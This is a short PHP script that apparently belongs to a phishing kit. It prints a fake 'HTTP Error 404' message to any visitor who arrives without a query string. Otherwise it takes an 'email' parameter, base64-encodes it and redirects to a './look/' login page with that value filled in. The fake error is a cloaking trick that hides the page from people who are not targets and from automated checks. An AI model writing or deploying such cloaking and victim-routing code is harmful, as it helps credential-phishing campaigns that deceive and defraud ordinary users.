<?php
$url = $_SERVER['QUERY_STRING'];

if (empty($url)=== true) {
      echo "HTTP Error 404- File or Directory not found.\n";
      die();
}

$email= $_GET['email'];
$log = base64_encode($email);

header("location: ./look/?login=$log");

?>
